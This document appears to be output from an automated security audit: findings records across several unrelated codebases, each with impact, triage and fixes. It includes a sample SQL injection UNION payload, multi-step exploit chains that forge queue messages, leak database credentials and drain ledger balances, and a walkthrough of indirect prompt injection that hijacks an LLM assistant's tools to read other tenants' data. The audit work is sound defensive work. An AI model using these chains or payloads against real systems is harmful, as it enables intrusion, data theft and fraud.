architecture.fell_back_and_why: No sub-agent failed to return; all 12 reported and no wave had to proceed without a member. Deviations from the reference stage order, all deliberate: (1) mantis-architecture and mantis-threat-model were run by the supervisor concurrently with wave A rather than strictly before it, because the plan was derivable from the directory survey and the six investigations are independent - the KB and THREAT_MODEL.md were on disk before any review/critic stage consumed them; (2) the supervisor executed the findings-only stages (plan, dedupe, calibrate, report) in its own context instead of delegating, since they read state rather than target code; (3) mantis-report's actionable predicate admits only repro_status=reproduced or statically_confirmed-with-an-empirical-trace, which no finding can satisfy because Stage 9 (reproduce) could not run - applying it literally would have emitted an empty report, so the static-confirmation tier was used instead and every finding carries status confirmed|probable rather than a reproduction verdict.

provenance.triage_rule_mapping: FP-01..FP-13 are MANTIS's own 13 Negative Constraints, verbatim from mantis-review/SKILL.md Step 3 (Strict Validation Filtering). They are not invented labels. FP-01 Ignore Hypothetical Misuse; FP-02 Ignore Missing Hygiene / Defense-In-Depth; FP-03 Require Strict Reproducibility; FP-04 Avoid Pedantic Linting; FP-05 No Security Flaw Stretching on Mitigations; FP-06 Evaluate Questionable File Paths; FP-07 Ignore Resource Exhaustion DoS; FP-08 Intrinsic Security Flaws (valid even with no caller); FP-09 Verify Mitigations Pragmatically; FP-10 Refine code_paths Strictly; FP-11 Ignore SIMD/Vector Padding Violations; FP-12 Ensure Source Code Coherence (Anti-Hallucination); FP-13 Verify Attacker Control of the Source (Trust-Boundary Tracing). ANSWER SEMANTICS: HOLDS = the false-positive rule APPLIES and would kill the finding (in MANTIS this forces status FALSE_POSITIVE); DOES_NOT_HOLD = the rule was evaluated and does not disqualify; NOT_APPLICABLE = the rule has no bearing on this finding class (FP-11 for all non-SIMD code); UNKNOWN = evaluated but not resolvable from the corpus, which is used rather than a guess in either direction. Consequently no reported finding carries a HOLDS. Where an agent produced a three-state answer outside this vocabulary ('PARTIALLY_HOLDS', 5 chain findings), it was normalised to UNKNOWN and the reason string records the unresolved reservation verbatim.

findings.title: Ingested document text is interpolated into the system prompt undelimited and unscreened, and reaches tool dispatch
findings.class: Indirect prompt injection into the instruction context (CWE-1427, OWASP LLM01) with reachable tool effects
findings.evidence:
_screen(question, "question")

    passages = retrieve.search(principal, question)
    system = SYSTEM_TEMPLATE.format(tenant=principal.tenant, context=retrieve.as_context(passages))
findings.impact: `SYSTEM_TEMPLATE` (assistant.py:14-24) is the model's system prompt, and `{context}` is filled with `retrieve.as_context(passages)`, which concatenates attacker-supplied document text with nothing but an index marker: `parts.append(f"[{index}] {title}\n{result['text']}")` (retrieve.py:72), joined by blank lines. Both the chunk body and the document `title` land inside the instruction block with no delimiter, no escaping and no statement that the material is untrusted data rather than instructions - the template even ends by telling the model what tools it may call (assistant.py:22-23), so injected text sits in the same channel as the tool authorisation. The text is attacker-controlled at ingest: `ingest_upload` (ingest.py:90-93) validates `body` only for size (ingest.py:46-51) and `title` only for length (ingest.py:33), and `consume_batch` (ingest.py:113-125) builds `Document(**message["doc"])` with no validation at all. `chunker.normalise` (chunker.py:21-26) strips HTML tags and collapses whitespace; it does not touch prose imperatives. The injected instructions reach real-world effect through the tool loop at assistant.py:115-140: `write_note` (tools.py:30-36) writes 40 KB of model-chosen content to `/var/lib/beacon/notes/<tenant>/<name>.md` on disk, and `search_index` (tools.py:39) performs an unfiltered cross-tenant index search whose results are pulled back into the same context - up to `max_tool_rounds: 6` (config/beacon.yaml:19) rounds per question. The guardrails are not a barrier here: `_screen` is invoked exactly once, on the user's `question` (assistant.py:107), and never on the retrieved passages, never on tool output, and never on the model's output; and `guardrails.mode` ships as `shadow` (config/beacon.yaml:32), under which `_screen` logs and returns without raising (assistant.py:44-46).
findings.recommendation: Move retrieved passages out of the system prompt into a clearly-fenced user-role data block with an explicit untrusted-content marker and a stable delimiter that the chunk text is escaped against; run `_screen` over `as_context(passages)` and over each tool result, not only over the question; and set `guardrails.mode: enforce`. Independently, gate the state-changing tool (`write_note`) so that it cannot be triggered by content the caller did not author.

triage.reason: No caller misuse is postulated. answer() itself builds the prompt and itself runs the tool loop; the whole chain is inside the audited module.

Not a bare hygiene gap. The finding is tied to concrete reachable effects - an on-disk write via write_note (tools.py:35) and an unfiltered cross-tenant read via search_index (tools.py:45) - both dispatched from the same loop the injected text steers.
Reproducible by ingesting one document whose body carries the instructions and then asking a question that retrieves it. No timing dependence.
No library-usage pedantry. str.format is used correctly; the defect is the trust boundary, not the API.

I did not stretch past a mitigation. The guardrail machinery exists but I verified it is applied only to the question (assistant.py:107) and ships in shadow mode (config/beacon.yaml:32), so it neither covers nor blocks this vector.
Production path throughout; no test or demo code involved.
Not a DoS claim; max_tool_rounds bounds the loop and that bound is respected.
The intrinsic-flaw carve-out is not needed - the ingress and the effect are both concrete.
No working mitigation was invented away. I looked for delimiting, escaping, an untrusted-content marker, and passage screening; none is present.
Exact line given: assistant.py:110, verified by re-reading, with the concatenation site retrieve.py:72 named in scope.
REVIEW: Not applicable in this engagement.
Verified in place: SYSTEM_TEMPLATE assistant.py:14, _screen assistant.py:40, as_context retrieve.py:67, normalise chunker.py:21, DocumentIn.body ingest.py:34, guardrails.mode config/beacon.yaml:32.

Attacker control traced to two concrete ingress lines: ingest.py:92 `parsed = DocumentIn.model_validate(raw)` on the authenticated upload endpoint, where `body` is bounded only by size, and ingest.py:123 `doc = Document(**message["doc"])` on the queue path, which applies no validation at all. Both flow through _points (ingest.py:64-82) into the payload `text` that retrieve.py:72 concatenates.

scope.established_by: answer() (assistant.py:102) is the only entry point that builds a model turn, and it constructs the system prompt at line 110 and dispatches every tool from the loop at lines 115-140; retrieve.as_context is the only formatter feeding {context}.
scope.narrowed_by: The fetch_url tool is not an exfiltration sink for injected instructions: _assert_allowed_host (tools.py:14-17) pins the hostname to config/beacon.yaml:49-50 and the client is built with follow_redirects=False (tools.py:24), so injected text cannot direct an outbound request off the two internal documentation hosts.

findings.title: Exploit Chain: unverified crawler ingest plants attacker text in the system prompt, which drives the model into the ACL-free search_index tool and dumps every tenant's chunks
findings.class: exploit chain
findings.evidence:
STEP 1 - unauthenticated write into the index. ingest.py:113-125 `consume_batch` drains the crawler queue (`beacon.documents`, config/beacon.yaml:39) and its sole gate is ingest.py:121 `if not _verify_producer(message): continue`. That function (ingest.py:107-110) is:
    return bool(message.get("signature")) and message.get("producer") in {"crawler", "connector"}
No key, no HMAC, no digest: the literal string "x" satisfies `bool(...)`, and `producer` is compared against a set the message itself supplies. The test-only escape on line 108 is inert because config/beacon.yaml:1 sets `env: production`.

STEP 2 - POSTCONDITION OF STEP 1: attacker-chosen bytes in the shared collection under attacker-chosen ACL metadata. ingest.py:123 is `doc = Document(**message["doc"])` - the raw dataclass (ingest.py:54-61), NOT the validated DocumentIn model. Everything DocumentIn enforces is skipped: the tenant pattern (`^[a-z0-9][a-z0-9-]{1,62}$`, ingest.py:35), the `_reject_wildcards` validator on acl_groups (ingest.py:38-44) and the 4 MiB body cap (ingest.py:46-51). index_document -> _points (ingest.py:64-82) writes `tenant`, `acl_groups`, `title` and `text` into the payload, and store.upsert (store.py:28-42) puts them in `beacon_docs`, the one shared multi-tenant collection (config/beacon.yaml:5). Setting tenant to the victim's and acl_groups to a group the victim holds makes the chunk match acl.group_filter (acl.py:42-52) on the victim's next query.

STEP 3 - PRECONDITION OF THE INJECTION IS EXACTLY THAT CHUNK. assistant.py:109-110:
    passages = retrieve.search(principal, question)
    system = SYSTEM_TEMPLATE.format(tenant=principal.tenant, context=retrieve.as_context(passages))
`{context}` sits inside the model's SYSTEM prompt (assistant.py:14-24), and as_context (retrieve.py:67-73) concatenates the attacker's document text and title with nothing but an index marker: `parts.append(f"[{index}] {title}\n{result['text']}")`. There is no delimiter, no escaping and no provenance marking. The screening function is called on the question ONLY - assistant.py:107 `_screen(question, "question")` - never on the context; and even where it fires it cannot refuse, because config/beacon.yaml:32 sets `mode: shadow` while assistant.py:45-46 raises only when the mode is 'enforce'.

STEP 4 - POSTCONDITION OF THE INJECTION IS TOOL DISPATCH, WHICH IS WIRED. assistant.py:115-140 runs up to `max_tool_rounds` (6, config/beacon.yaml:19) rounds; every tool_use block is executed by _run_tool (assistant.py:94-99) and TOOL_SPECS is sent to the model on every call (assistant.py:87). _validate_tool_input (assistant.py:49-74) checks argument SHAPE only - it never asks who or what asked for the call.

STEP 5 - the reachable tool has no tenant filter. tools.py:39-49 `search_index(principal, query, top_k=8)` accepts `principal` and never reads it; it calls `store.raw_search(config()["store"]["collection"], vector, top_k)` - store.py:74-82, documented `"""Search with no payload filter."""` - against `beacon_docs`, the collection every tenant's documents are written into. Its safe sibling store.search (store.py:63) takes a `query_filter` and is what retrieve.search uses at retrieve.py:50 with `group_filter(principal)`; the tool path bypasses it. The tool returns `title` and `text` of the top hits, and the model is free to put them in the answer.
findings.impact: A document author who can reach the crawler queue - profile A5, and with _verify_producer as written that means anyone who can enqueue a message, with no key and no credential - plants a document whose body is an instruction. When the assistant answers a question that retrieves it, the instruction is inside the SYSTEM prompt, and the model has a tool that reads the shared multi-tenant collection with no ACL predicate. The attacker gets cross-tenant document content out of an index whose entire security model is the tenant+acl_groups payload filter; the highest-value invariant in the threat model ('model-visible untrusted text must never be able to reach an effectful tool') is defeated end to end. The attacker can target their own session (plant the injection, ask the question themselves, read the dumped chunks in the answer) or a victim's session (forge the tenant/acl_groups so the document is retrieved for the victim, and use write_note or fetch_url with the victim's principal). No authentication is needed at the entry point.

findings.title: _verify_producer checks only that a signature field is present, never that it is valid, and the accepted document skips all schema validation
findings.class: Improper verification of cryptographic signature (CWE-347) leading to ACL forgery on ingest
findings.impact: The function is named `_verify_producer` and is the sole gate in `consume_batch` (ingest.py:121). It never verifies anything: `bool(message.get("signature"))` is satisfied by any non-empty value - the literal string `"x"` passes - and `producer` is compared against a two-element set that the message itself supplies. No key, no HMAC, no digest of the document, and no signature verification routine exists anywhere in the package. What gets through is worse than an unauthenticated document: line 123 constructs `doc = Document(**message["doc"])` from the raw dict, bypassing the `DocumentIn` pydantic model entirely, so none of the validation on the authenticated upload path applies - not the tenant pattern `^[a-z0-9][a-z0-9-]{1,62}$` (ingest.py:35), not `_reject_wildcards` on acl_groups (ingest.py:38-44), not the `max_document_bytes` size check (ingest.py:46-51). findings.title: Retrieval cache key omits the principal, so ACL-filtered passages are served across tenants and groups
findings.class: Multi-tenant authorization bypass / cache key confusion (CWE-524, CWE-639)
findings.impact: `_cache` (retrieve.py:10) is a process-global OrderedDict, and `search()` consults it at retrieve.py:45 BEFORE it ever builds `group_filter(principal)` at retrieve.py:50. The key is derived only from the query string and the limit, so the identity dimension (tenant, subject, groups) is absent. The first caller to ask a question populates the entry with passages filtered to THEIR tenant and THEIR groups; every other caller asking the same string within `cache_ttl_seconds: 120` (config/beacon.yaml:57) receives those passages verbatim. `assistant.answer` calls `retrieve.search(principal, question)` with no top_k (assistant.py:109), so limit is always the config default 8 and collisions are the normal case, not a corner case. findings.title: Model-callable search_index tool queries the tenant collection with no ACL filter, dumping every tenant's chunks
findings.class: Broken access control on an LLM tool (CWE-285, CWE-863) / excessive agency

def search_index(principal: Principal, query: str, top_k: int = 8) -> list[dict]:
    """
    Second-pass lookup the model can ask for when the first context block did
    not contain the answer.
    """
    vector = store.embed([query])[0]
    hits = store.raw_search(config()["store"]["collection"], vector, top_k)
findings.impact: `search_index` accepts `principal` as its first parameter and never reads it. The safe sibling `store.search` (store.py:63) takes a `query_filter` and is the one `retrieve.search` feeds `group_filter(principal)` into (retrieve.py:50); this tool takes the other door. The tool is live in `TOOL_SPECS` (tools.py:74-85) and `TOOL_REGISTRY` (tools.py:91), is advertised to the model on every turn via `"tools": tools.TOOL_SPECS` (assistant.py:87), and is dispatched by `_run_tool` as `handler(principal, **...)` (assistant.py:99) - the principal is handed over and dropped on the floor. findings.title: gateway.strip_headers omits x-beacon-groups, so a client can choose its own ACL groups
findings.class: Authorization bypass via client-controlled identity header (CWE-290, CWE-807)
findings.evidence:
gateway:
  strip_headers:
    - x-beacon-principal
    - x-beacon-tenant
    - x-beacon-request-id
findings.impact: The comment above this block (config/beacon.yaml:21-22) states the contract: "The gateway rewrites the caller identity onto the request before it reaches us. Anything listed here is dropped from the inbound request first." The list enumerates three headers. `acl.principal_from_headers` reads FOUR: `x-beacon-principal` (acl.py:34), `x-beacon-tenant` (acl.py:35) and `x-beacon-groups` (acl.py:38). The groups header is the one omission, and it is the one that decides what a caller may read WITHIN their own tenant: `group_filter` builds `{"key": "acl_groups", "match": {"any": list(principal.groups) or ["__none__"]}}` (acl.py:50), and `may_read` intersects the same set (acl.py:59). A client that sends `X-Beacon-Groups: finance,legal,exec-staff` therefore reaches the application with those groups intact, because nothing in the declared policy drops it, and `principal_from_headers` performs no validation on the value beyond splitting on commas and stripping whitespace. Every document in the caller's tenant whose `acl_groups` payload (written at ingest.py:74) names any guessed group becomes readable through `retrieve.search` (retrieve.py:50) and is quoted back by the assistant. The group names are not secret - they are ordinary org labels, and `_reject_wildcards` (ingest.py:38-44) only bars `*`, `all` and `public`, so real group names must be used and guessed. The omission is what makes the attack possible; the two headers that WOULD have been the more direct attack (principal, tenant) are correctly stripped, which is what shows this list is the intended control and that groups fell out of it.
findings.recommendation: Add `x-beacon-groups` to `gateway.strip_headers`. Because a config list is a silent control - anything absent passes without a signal - also harden the consuming side: have `principal_from_headers` reject a request whose group membership was not signed or attested by the gateway, rather than deriving groups from a raw header, and treat an empty group set as a hard deny instead of the `["__none__"]` sentinel.

findings.title: Any failure of the pinned request silently retries the same authenticated call unpinned against the failover host
findings.class: Certificate-pinning bypass through fail-open error handling (CWE-295, CWE-636, CWE-757)
findings.impact: The catch block treats every non-ApiError failure as a transport problem and reissues the identical request - same headers, therefore the same 'authorization: Bearer <token>' built at client.ts:22-27, and the same body - to PROFILE.fallbackBase with an empty pin set. Passing [] to send() means sslPinning.certs is empty, so the request falls back to ordinary system trust with no pin enforcement. A pin-validation failure is exactly one of the errors caught here, which inverts the control: an on-path attacker presenting a certificate that chains to any device-trusted CA (an enterprise MDM root, a user-installed root, or a compromised public CA - all plausible given the untrusted-device model) causes the pinned attempt to fail and the app then re-sends the credential and payload over the attacker-terminated connection. The attacker does not even need to break the pinned host: dropping or resetting TCP to api.harborlight.app is enough to force every call onto the unpinned path deterministically. Attacker-controlled responses are then parsed as trusted API data (client.ts:77), which also feeds attacker-chosen values such as ticket.targetUrl in uploads.ts:58-61.
findings.recommendation: Pin the failover host too - add its chain to PROFILE.certificatePins and pass PROFILE.certificatePins on the retry - and never widen trust as a consequence of an error. Distinguish TLS/pinning errors from connectivity errors and fail closed on the former (surface the failure, do not retry). Also stop retrying non-idempotent methods (POST createTransfer/confirmTransfer) blindly, since the retry can duplicate a money movement.

triage.reason: The downgrade is implemented inside call() itself; no caller behaviour is required.
Pinning is not merely absent here - it is present, then discarded at runtime by an error path the attacker can trigger, which defeats the control the production profile deliberately configures.
Deterministic and automatable: an on-path attacker blocks or resets connections to the primary host, and every subsequent call takes the unpinned branch. No race.
Not pedantry over correct library use - react-native-ssl-pinning is used correctly on the first attempt and then invoked with an empty certs array on the second.

findings.title: Refresh token written to plain AsyncStorage, bypassing the module's own unprotected-storage allow-list and voiding the Keychain access control
findings.class: Long-lived credential stored in cleartext, unprotected storage (CWE-312, CWE-522)
findings.evidence: await AsyncStorage.setItem(REFRESH_WARM_KEY, tokens.refreshToken)
findings.impact: The refresh token - the longest-lived credential the app holds - is mirrored into AsyncStorage, which the repository's own documentation (secureStore.ts:8-10) describes as 'plain AsyncStorage, which is readable by anything that can reach the app sandbox'. Under the stated threat model (untrusted device: rooted/jailbroken handset, ADB/iTunes or cloud backup extraction, forensic imaging, any malware with sandbox access) the plaintext copy is recoverable without the biometric or passcode prompt that putSecret attaches to the Keychain entry (ACCESS_CONTROL.BIOMETRY_CURRENT_SET_OR_DEVICE_PASSCODE, secureStore.ts:36) - so the Keychain protection on the same secret is reduced to decoration. It also defeats the module's declared control: putRaw refuses any key absent from NON_SECRET_KEYS (secureStore.ts:22-25) and 'hl.refreshWarm' is not on that list, but session.ts imports AsyncStorage directly at line 1 and writes around the gate. restore() then prefers the Keychain but falls back to the same plaintext copy (line 34), so the weak path is load-bearing, not vestigial. findings.recommendation: Delete the AsyncStorage mirror and its read-back fallback (session.ts:26 and the '?? await AsyncStorage.getItem(REFRESH_WARM_KEY)' at line 34). If cold start must decide the login screen before the Keychain prompt resolves, persist only a non-secret hint (a boolean or an expiry timestamp) through putRaw with the key added to NON_SECRET_KEYS. Enforce the boundary structurally by making session.ts import only from secureStore, and add a lint rule banning direct AsyncStorage imports outside src/storage/.

findings.title: case_summary caches a clearance-dependent projection under a key made only of case_id, serving privileged fields to under-cleared principals
findings.class: Cache key omits authorization dimension / sensitive data exposure to unauthorized actor (CWE-524, CWE-200)
findings.evidence: return cache.get_or_set(cache.summaries(), cache.summary_key(case.id), produce)
findings.impact: The cached value is computed by produce() (repository.py:101-111), whose content depends on the calling principal: policy.visible_fields (policy.py:71-75) returns Visibility(FULL_FIELDS, include_redacted=True) for a principal whose clearance rank is >= 30 ('elevated' or 'partner') and Visibility(BASE_FIELDS, include_redacted=False) for 'standard' or 'restricted'. The key, cache.summary_key (cache.py:13-14), is `f"summary:{case_id}"` and carries neither the principal, the clearance, nor the firm. So on a 'standard'-sensitivity matter, which both principals legitimately pass policy.assert_can_read for: a partner opens the matter screen first and the cache stores the FULL projection; within the 90-second TTL (cache.py:9) any standard- or restricted-clearance colleague calling case_summary gets a straight cache hit, produce() never runs, and they receive the partner's projection. Concretely they obtain the `latest` note as {id, case_id, category, created_at, body, author_id, billable_minutes, redacted_at} instead of the redaction stub {id, case_id, redacted: True} that policy.project (policy.py:78-80) would have produced for them, i.e. the body text of a note that has been redacted, plus author attribution and billable_minutes, which for their own clearance would sum to 0 because BASE_FIELDS carries no billable_minutes at all. The assert_can_read call on line 99 does not prevent this: it gates access to the case, not to the higher-clearance field set.
findings.recommendation: Make the key cover every dimension the value depends on, e.g. summary_key(firm_id, case_id, policy.clearance_of(principal)) (the file already models this correctly for headers: header_key(firm_id, case_id), cache.py:17-18). Alternatively cache the raw note rows once per case and run policy.visible_fields/policy.project on every read after the cache lookup, so the projection is never the thing that is shared. Note that drop_case (cache.py:38-39) must then evict all clearance variants of a case, not one key.

triage.reason: No caller misuse is required. Two ordinary, correctly-authorized calls by two different principals of the same firm are enough; the key construction inside case_summary is what conflates them.
Not a hygiene gap: the cache hit actively returns data the requesting principal's own policy evaluation would have withheld.

findings.title: SQL injection: search term f-string-interpolated into a raw text() ILIKE literal in search_notes
findings.class: SQL injection (CWE-89)
findings.evidence:
f"""
            select n.id, n.case_id, n.category, n.created_at,
                   left(n.body, 240) as excerpt
            from case_notes n
            where n.body ilike '%{needle}%'
              and n.redacted_at is null
            order by n.created_at desc
            limit {int(limit)}
            """
findings.impact: escape_like() (search.py:13-17) only backslash-escapes the two LIKE metacharacters '%' and '_'; it never escapes the single quote. A search term containing an apostrophe therefore terminates the SQL string literal and the remainder of the term is parsed as SQL. Because the statement is a raw text() executed on the session's connection, the attacker inherits the full rights of the application database role: UNION-select any table (principals, firms, cases of every tenant), or, since psycopg3 permits multiple statements in a simple-query text() execute, chain a data-modifying statement. Example term: x' union all select id, firm_id, email, clearance, clearance from principals -- . Note the sibling function search_docket (search.py:46-57) binds its needle correctly as :needle, which shows the safe form was available and understood in the same file.
findings.recommendation: Bind the pattern instead of interpolating it: text("... where n.body ilike :needle escape '\\' ...") executed with {"needle": f"%{escape_like(term.strip())}%", "limit": int(limit)}, exactly as search_docket already does. Escaping LIKE metacharacters is a pattern-semantics concern and is not a substitute for parameter binding.

triage.reason: The defect is inside search_notes itself, not in a caller. No caller can supply a term that makes the f-string safe, because the function performs the concatenation.
This is not a missing hardening layer; it is a directly exploitable injection into a raw SQL string literal.

Strictly reproducible and deterministic: any term containing a single quote alters the parsed statement. escape_like() provably does not touch the quote character (LIKE_METACHARACTERS = ("%", "_"), search.py:10).

The one value that IS safely cast, limit via int() on search.py:37, is not flagged, and the correctly parameterised sibling search_docket is explicitly excluded. findings.impact: The primary download in the role pins the artifact -- roles/app/tasks/main.yml:26 passes `checksum: "{{ stanchion_artifact_sha256 }}"` -- so the integrity control exists and the expected digest is already in the repo (group_vars/all.yml:12). Any failure inside the block (the comment names flaky downloads from releases.stanchion.net) silently routes the rollout onto a second host, mirror.eu.stanchion.net, whose bytes are never checked against the known digest, and the very next tasks unarchive that tarball into {{ stanchion_root }}/releases (site.yml:30-35) and restart the unit (site.yml:37-41), whose ExecStart runs a binary out of that tree (roles/app/tasks/main.yml:98). findings.impact: stanchion_root is /opt/stanchion (group_vars/all.yml:6) and the rendered environment file lives at {{ stanchion_root }}/app.env (roles/app/tasks/main.yml:42), deliberately created 0600 and owned by the unprivileged service account, with `no_log: true` on the task. findings.title: Exploit Chain: the static-asset handler makes the 0600 app.env world-readable, and the pooler published on 0.0.0.0:6432 turns that local read into remote production database access
findings.class: exploit chain
findings.evidence:
STEP 1 - the secret is written correctly. roles/app/tasks/main.yml:39-47 renders app.env to `{{ stanchion_root }}/app.env` = /opt/stanchion/app.env (group_vars/all.yml:6) with `mode: "0600"`, owner stanchion, and `no_log: true`. Its contents include the live production database credential: app.env.j2:22-26 emits PGHOST=db-01.stanchion.net, PGPORT=5432, PGDATABASE=stanchion, PGUSER=stanchion_app and `PGPASSWORD={{ postgres_password }}`, which playbooks/site.yml:13 pulls from Vault.

STEP 2 - a handler then removes that protection. roles/app/handlers/main.yml:15-19:
- name: refresh static assets
  ansible.builtin.command:
    cmd: "chmod -R a+rX {{ stanchion_root }}"
`-R a+rX` on /opt/stanchion adds read for other on every regular file in the tree, app.env included; 0600 becomes 0644. Ordering is not in doubt: the handler is notified by 'Unpack the release' at tasks/main.yml:35-37, and handlers flush at the END of the play, i.e. after the template task on line 39 has already written the file. POSTCONDITION: every unprivileged local account on the host can read the production database password.

STEP 2b - the same credential has a second disclosure route, which is why fixing the chmod alone is not enough. playbooks/rotate-secrets.yml:20-23 prints it: `ansible.builtin.debug: var: rotated_password`, with the `no_log: true` that protects the identical value one task earlier (line 18) omitted.

STEP 3 - PRECONDITION OF THE SECOND LINK IS EXACTLY A VALID DATABASE CREDENTIAL, and the listener that consumes it is open to the world. roles/app/tasks/main.yml:57-61:
    published_ports:
      - "127.0.0.1:{{ app_listen_port }}:8080"
      # The rollup job and the read-replica tooling connect straight to the
      # bundled pgbouncer instead of going through the app.
      - "0.0.0.0:6432:6432"
The line above shows the author knows how to bind a published port to loopback; this one publishes the bundled connection pooler on every interface. playbooks/site.yml:9 applies the role to `appservers:edge`, so that is all five production hosts (inventory/production.yml:16-20 and 9-12), and group_vars/edge.yml:2 states the edge tier is internet facing. The comment establishes the intended usage: external tooling authenticates to that pooler with database credentials - the credentials step 2 just published.

STEP 4 (why it is silent) - the control that would have recorded the permission change never installs. tasks/main.yml:63-84 gates the hardening block on `when: "'production' in group_names"`, and inventory/production.yml defines the groups edge, appservers, bastion and datastores (lines 7, 14, 23, 29) - none named 'production'; the string appears only as the value of `stanchion_env` on line 3, which never enters group_names. The auditd rule `-w {{ stanchion_root }}/app.env -p wa -k stanchion_env` (line 82), whose `-p wa` would have caught exactly the chmod's attribute change, is therefore never written.
findings.impact: An unprivileged local account on any of the five app/edge hosts - the threat model's profile A6, e.g. a compromised sidecar, a CI runner, a low-privilege service account or a support user - reads /opt/stanchion/app.env and obtains PGUSER/PGPASSWORD for the production `stanchion` database, plus PGHOST. It then connects to the pgbouncer published on 0.0.0.0:6432 on any of those hosts, from anywhere that can route to them, including the internet for edge-01/edge-02. The result is authenticated production-database access from off-host, and no audit record of the permission change that made it possible. Neither half achieves this alone: without the chmod the pooler still demands a credential the attacker does not have, and without the open port the leaked credential is only usable from a host that already has it in its environment. The composition converts a local file-permission mistake into a remote data-plane breach.
findings.recommendation: The single link that breaks the chain is the published port: change tasks/main.yml:61 from `"0.0.0.0:6432:6432"` to `"127.0.0.1:6432:6432"` (and give the rollup and read-replica tooling an explicit, authenticated path). That removes the off-host consumer of any leaked credential, whichever way it leaks. The obvious fix - narrowing the chmod - does NOT close the chain: the same password is printed in clear text by the rotation playbook's debug task (rotate-secrets.yml:20-23, whose `never` tag controls when it runs, not who may read the output), so a second disclosure route stays open onto the same wide-open listener. All of these should be fixed - scope the handler to `{{ stanchion_root }}/static` instead of the whole tree, add `no_log: true` to the debug task, and correct the hardening block's condition (tasks/main.yml:64) so the auditd watch actually installs - but only the port binding severs the composition.

triage.reason: [normalised from a partial answer to UNKNOWN: the rule does not kill the finding, but the reservation below is unresolved] There is no attacker-controlled INPUT at the entry point - this is a configuration chain, not an injection - so the applicable question is attacker POSITION. The position required is an unprivileged local account on an app or edge host, which is threat-model profile A6 and requires no credential of the application's own; from there both steps are pure reads and an ordinary outbound TCP connection. No operator action is needed for the primary route (the chmod runs on every deploy that unpacks a release, tasks/main.yml:35-37).

Both links are on the production inventory. playbooks/site.yml:9 runs the app role on `appservers:edge`; inventory/production.yml lists app-01/02/03 and edge-01/02 with stanchion_env: production; the handler is notified by the unpack task on every release change; and the published_ports entry has no conditional. There is also no firewall to fall back on: the ufw default-deny task, despite being named 'Default deny inbound on every host in the fleet', lives in roles/bastion (tasks/main.yml:7-11) and site.yml:2-6 applies that role to `hosts: bastion` only, so app and edge hosts get no repo-managed inbound policy.

findings.title: Signature check is skipped for any entry carrying the unauthenticated field verified=1, and dlq.replay stamps exactly that field on entries parked for bad-signature
findings.class: Authentication bypass via unauthenticated in-band trust flag (CWE-290, CWE-807)
findings.evidence: if (entry.verified !== '1' && !verifySignature(envelope, entry.signature, log)) {
findings.impact: `entry.verified` is an ordinary Redis stream field parsed by fieldsToObject (consumer.js:41-45). It is not covered by the HMAC -- canonical() at signing.js:7 signs only id, type, ts and payload -- and nothing proves who wrote it. Two concrete consequences. (1) Anyone able to XADD to `ledger.events` adds `verified 1` and the signature check is short-circuited, so this bypass survives flipping signature.mode to "enforce" and silently defeats the remediation for the fail-open finding. (2) dlq.js:37 re-adds every parked entry to the live stream with `'verified', '1'`, and the entries parked at consumer.js:62 are precisely the ones rejected with reason 'bad-signature'. A forged message therefore only has to be rejected once: the routine operator action `node src/dlq.js replay` (dlq.js:31, batch of up to 500 per config/default.json:29) promotes it to trusted and it reaches the handlers with no verification at all. The DLQ comment at dlq.js:27-30 asserts parked entries "were checked once on the way in", which is false for the bad-signature bucket -- they were checked and they failed.
findings.recommendation: Delete the `entry.verified !== '1'` short-circuit and verify every entry on every read; verification is a single HMAC and costs nothing. If replay must be cheap, have dlq.replay carry the original `signature` field through so the consumer can re-verify, and refuse to replay entries whose parked reason is 'bad-signature'.

findings.title: Exploit Chain: forged stream message walks the fail-open signature gate, lands on the schema-less payout.release.v2 handler and drains an account through the unchecked adjustBalance path
findings.class: exploit chain
findings.evidence:
ENTRY (no credentials beyond reaching the broker; profile A3). config/default.json:2-4 points the consumer at `redis://tallyflow-redis:6379` with no password and no TLS, stream `ledger.events`. The attacker XADDs one entry with fields `body` and `verified`.

STEP 1 - envelope shape. consumer.js:51 `validateEnvelope(envelope)` enforces only id (uuid), type (string <=64), ts (integer >=0) and payload (object) - schema.js:14-24. `payout.release.v2` satisfies it.

STEP 2 - the signature gate is a no-op, TWICE OVER. consumer.js:60: `if (entry.verified !== '1' && !verifySignature(envelope, entry.signature, log))`.
  (a) signing.js:38-45 - `if (!matches || !fresh) { log?.warn(...); if (config.signature.mode === 'enforce') return false } return true`, and config/default.json:21 ships `"mode": "warn"`, so the only `return false` is unreachable and every envelope, signed or not, is reported verified.
  (b) even if mode is flipped to 'enforce' - which config/default.json:20 says is the plan (`"comment": "flip to enforce once every producer ships the signing sidecar"`) - the left-hand side short-circuits: `verified` is an ordinary stream field parsed by fieldsToObject (consumer.js:41-45), it is NOT covered by the HMAC (canonical() at signing.js:7 signs only id, type, ts and payload), and nothing proves who wrote it. The attacker simply XADDs `verified 1`. dlq.js:37 stamps the same field on every replayed entry, so the field is a legitimate part of the wire format.

STEP 3 - POSTCONDITION OF STEP 2 (an unsigned envelope is inside the trusted region) IS THE PRECONDITION OF THE SCHEMA GATE, which also fails open. consumer.js:66 `const payloadError = validatePayload(envelope.type, envelope.payload)`; schema.js:68-70 `const validate = validatorFor(type); if (!validate) return null` and consumer.js:67 treats null as a pass. EVENT_SCHEMAS (schema.js:27-52) defines only 'ledger.post.v1' and 'payout.release.v1'. Grep of the component shows 'payout.release.v2' appears nowhere except consumer.js:30, where it IS a registered live handler:
  'payout.release.v2': makePayoutReleaseHandler({ ledger, pool, idempotency, log }),
So for v2 there is no accountId pattern (`^acct_[0-9a-f]{16}$`), no `amountCents` integer type, no `maximum: 50000000`, and no additionalProperties:false.

STEP 4 - the handler's only remaining gate is producer-chosen. payoutRelease.js:10 `const key = p.idempotencyKey ?? envelope.id`, claimed at line 12. The key is a free-form producer string bound to no dimension of the operation (idempotency.js:15 uses the single global prefix 'ik' from config/default.json:25), so the attacker supplies a fresh value and `claim` always returns fresh:true.

STEP 5 - money leaves. payoutRelease.js:19-23 inserts a row into `payouts` with status 'released' for the attacker's own `destination`, then line 28:
    await ledger.adjustBalance(p.accountId, -Math.abs(p.amountCents))
ledger.js:59-65 is a bare upsert - `on conflict (account_id) do update set balance_cents = balances.balance_cents + $2` - with no amount validation, no `config.limits.maxPostingCents` ceiling, no `select ... for update`, no negative-balance refusal, and no shared transaction with the payouts insert. All of those controls exist twelve lines above in applyPosting (ledger.js:9-14, 18-28) and are simply not on the money-OUT path.
